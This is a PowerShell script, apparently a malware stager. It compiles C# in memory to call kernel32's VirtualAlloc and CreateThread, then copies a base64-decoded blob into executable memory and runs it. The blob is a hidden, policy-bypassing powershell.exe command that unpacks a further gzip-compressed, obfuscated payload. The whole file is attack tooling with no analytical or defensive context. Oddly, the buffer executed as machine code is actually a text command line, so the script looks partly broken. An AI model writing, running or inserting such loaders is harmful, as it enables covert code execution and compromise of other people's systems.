Set-StrictMode -Version 2
$esvse = @"
	using System;
	using System.Runtime.InteropServices;
	namespace yfMe {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$lSm = New-Object Microsoft.CSharp.CSharpCodeProvider
$aAg_ = New-Object System.CodeDom.Compiler.CompilerParameters
$aAg_.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$aAg_.GenerateInMemory = $True
$ll0G = $lSm.CompileAssemblyFromSource($aAg_, $esvse)

[Byte[]]$gE = [System.Convert]::FromBase64String("cG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLW5vbmkgLWVwIGJ5cGFzcyAiJihbc2NyaXB0YmxvY2tdOjpjcmVhdGUoKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uR3ppcFN0cmVhbSgoTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0oLFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFOQkpBMXNDQTUxV1hXL2JOaFI5OTYrNGNMVmFRaXpDZGxHMEM1QmlxWkp1QWJMV3FMemx3VEFRbXJxT3RjaWtTMUwrUU9ML1BsS2lMRGxPMEdWNnNVVmVubnZ1dVIvVUd4aUtOY3BaemlHRUc1bHFqUnltVy9oc2ZrYTU1Q2poTFZ6UUZjSWZWQ2JiVnN0WU1wMEtEcitqRG05d3lySVV1WWJXUXd2TTQ2MFpuTUZYWElmZnB2OGcweENPdGt2OFNoZG9GalV4OWxGaFh4bVR2eFJlNEl6bW1ZNGtKbVlucFpreUVKNldPZTZ0aGxKc3R1U0poVmx2ckZTMnJWMU5jVm1GMW5xQVluOUlKVjM0NWY5eHJHWEs3eVplSkJZTHlwUHU0V3FzTWliNGs4VUxzZWFab0VteEdqaE1LUmdxQlU2QWhVanlEQzNCMy93QVNwTjBCbjdsQmtMOEFlMXB5cE4yVUd5VzU0cXpXYXFNL0VieU0rTnlhLzR2aUZVdEZ1d2V0U0lqdHJ4MkZwUCt1M2Nmamc4U3BhblUxcS96WE95NkZKMDE3TTRadzZVMmdHVTYvSkxLN2lXNkVsY29GUjR6M2tNM1V2NGM4MmpvSExWLy9VRDZneDc1MkNlRHdjZDIxOGJobkxkS0FaV1dTQmVXYlFsT1RLSEZ4WnBoV2ZNcjgxUFNzN1hTZHVsb2tGTXFpeXV3Ri9naHkwM05iMGxjbWZyT2Y5ZWJtYUxDcnYvZ2pRejZEa0txWUh4dzVqc3VoTVlJcFU1bkthTWEvNlpabWxCYmVSSE5zaWxsOTVNZ2VJWU9PYy8xM0phdFBYU3VubGNtYUNTd2xxUU9xYW5aZUxyVk9KNU1QUHRyUzY5SHlLQm5uc2RmSG5vN0p5dnlwTnIyeHhvM21pQm5JckYxZlhwNkhrZFhWNEdWK3JPMThkczNwa0RGV3BYVElaNWpsb0hNT1RmV1lJVElsU25TTnB5QWgzeDFhdCs0YmZFVHMyWnlzdDlnWXJITWRiMTV5eU94M01yMGJxN0Jqd0lZOVBydjRjK1VTYUhFVEVNazVGTElRa0FDNTlhanRWUWcwVGhZWVVKdStTMTNOZWcwSVhaa29WOUgxKzExNnhkeWpmeE96NXRsVTNWd3MzQ082dVoxVW8xUEpuQnRJSzAycnZ2Sm51ZnJ1VmFudmdoNVNkbmNjQzVCSWVYNzZWSmIxYlR0NHg4TTVZQlUwWmJ6cTBJS0hxLzRTdHhqZUxsWkdtMlYwWHVQc2p2c3hWY3AwUm5HMERGNUxsaGNDMVprTWlCRHF1ZG10Zk9wODc5VHQ1Nm5HZnErbHhZOVVCNy9qalR4eTRydlFxOEwzc0c1QUVLTzBEdks3YVdsajhuSWhQTFNSZVhtZ3pVaFJZaVhMdVFheFhRNXRWUWFhRzVNRlRKWDRZQ1hCay9LeWd3RnErVlJBaUNzQm00SlB2ajB0ZytQOEMzWFlZa0tUb29EcUFFVWdsVEFSdVNmcEFBNk5jakdFdkZRU2lISHZjbUJzd2JyWXArd0RLbjBnK2NZbkRWZlRPTnZXc2VkOUovS3A0YjVhZXMwUytXb2Nhb3pYN0pjemZkM3NCdUQ3azZKTXFIUXhWUGZpckVXeStvcU5OOFJyZjMzd3o0NTdpS0UwRjAvZG9EOEMxYmlrSjlEQ1FBQScpKSksW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCkpKSI=")

$wI = [yfMe.func]::VirtualAlloc(0, $gE.Length + 1, [yfMe.func+AllocationType]::Reserve -bOr [yfMe.func+AllocationType]::Commit, [yfMe.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$wI) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($gE, 0, $wI, $gE.Length)
[IntPtr] $zA = [yfMe.func]::CreateThread(0,0,$wI,0,0,0)
if ([Bool]!$zA) { $global:result = 7; return }
$kk = [yfMe.func]::WaitForSingleObject($zA, [yfMe.func+Time]::Infinite)
